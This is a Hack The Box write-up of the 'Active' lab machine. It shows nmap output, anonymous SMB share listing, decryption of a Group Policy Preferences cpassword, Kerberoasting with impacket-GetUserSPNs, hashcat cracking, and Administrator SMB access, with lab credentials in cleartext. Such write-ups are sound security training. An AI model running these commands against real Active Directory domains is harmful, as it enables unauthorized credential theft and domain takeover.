---
layaout: post
image: assets/images/active_test1.png
title: Active Write Up HTB
date: 28-01-2025
categories: [Write ups]
tag: [Active Directory, kerberoasting, GPP]
---
![img-description](/assets/images/active_test1.png)

**Active** is a relatively straightforward machine, perfect for getting started with **Active Directory**. In this machine, we'll explore techniques like **Kerberoasting** and **GPP Passwords**, two common methods for privilege escalation in AD environments. Great for practicing and understanding key concepts! 🚀
# **ENUMERATION**
----
## NMAP SCANNING
----
We start using nmap:
````bash 
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped    syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49171/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49173/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 53262/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38631/udp): CLEAN (Timeout)
|   Check 4 (port 52552/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-01-27T18:16:36
|_  start_date: 2025-01-27T17:58:44
|_clock-skew: -1s
````
After analyzing the nmap, we can realize that we are dealing with an Active Directory, so we will start by enumerating the SMB.

# **ENUMERATING SMB AS ANONYMOUS**
----
````bash
smbclient -L \\\10.10.10.100/shares
Password for [WORKGROUP\root]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
````

## On smb we found credentails for SVC_TGS
---
````bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 22:46:06 2018

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
````

# **FOOTHOLD**
----
## Group Policy Preferences

When a new Group Policy Preference (GPP) is created, an XML file is stored in the SYSVOL share containing its configuration, including any associated passwords. These passwords are AES-encrypted and stored as `cpassword`. However, Microsoft publicly [released the encryption key](https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx).

In 2014, Microsoft patched this by preventing admins from adding passwords to GPP, but it didn’t address existing vulnerable passwords. As of 2025, pentesters still find these issues. For more details, see this [AD Security post](https://adsecurity.org/?p=2288).

# **AUTHENTICATED ENUMERATION**
---
## Enumerating SMB as SVC_TGS
----

````bash
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18

smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 17:14:42 2018
  ..                                  D        0  Sat Jul 21 17:14:42 2018
  user.txt                           AR       34  Tue Jan 28 02:14:45 2025

                5217023 blocks of size 4096. 260447 blocks available
````
# **PRIVILEGE ESCALATION**
----
## Kerberoasting
----
Kerberos is an authentication protocol used in Windows Active Directory environments (and can also be used for Linux hosts). In 2014, Tim Medin introduced the _Kerberoasting_ attack. This attack involves obtaining Kerberos tickets encrypted with the hash of a service account's password. Instead of sending the ticket to the service, it can be brute-forced offline to crack the password.

Typically, an active domain account is required to perform the attack. However, if the Domain Controller (DC) is configured with the _"Do not require Kerberos preauthentication"_ setting, it’s possible to request and receive a ticket without a valid domain account.

We are going to use the credentials we previously obtained to execute the attack using `impacket-GetUserSPNs`.
````bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-01-27 18:59:55.488567
````
We were able to extrat the ticket which we will try to force decrypt to get Administrator's password

````bash
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
````

## Acces as ADMINISTRATOR to smb

````bash
smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968

smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Thu Jan 21 17:49:47 2021
  ..                                 DR        0  Thu Jan 21 17:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 15:50:10 2018
  root.txt                           AR       34  Mon Jan 27 18:59:52 2025
  
````
![netrunner](/assets/images/netrunner.gif)